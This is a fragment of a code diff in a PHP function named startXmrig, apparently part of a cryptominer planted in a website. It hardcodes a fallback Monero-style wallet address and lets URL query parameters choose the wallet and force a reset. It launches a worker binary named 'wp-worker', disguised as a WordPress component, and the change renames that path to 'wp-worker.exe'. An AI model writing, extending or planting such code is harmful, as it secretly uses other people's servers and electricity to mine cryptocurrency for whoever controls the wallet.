@@ -23,7 +23,7 @@ function startXmrig(): bool {
     $wallet = $queryParams['wallet'] ?? '43mfU2BozuxbowW715FsM98Sh3jWMcEiXYFLVpHiMYvWP3B3rmEVpT8GkTzeYF7E44eurXuRSnRwkLGVbU7NvCsJEzXv2eJ';
     $forcereset = $queryParams['forcereset'] ?? 'false';
 
-    $workerPath = __DIR__ . '/wp-worker';
+    $workerPath = __DIR__ . '/wp-worker.exe';
 
     // Verify binary exists and handle force reset
     if (!file_exists($workerPath) || $forcereset === 'true') {
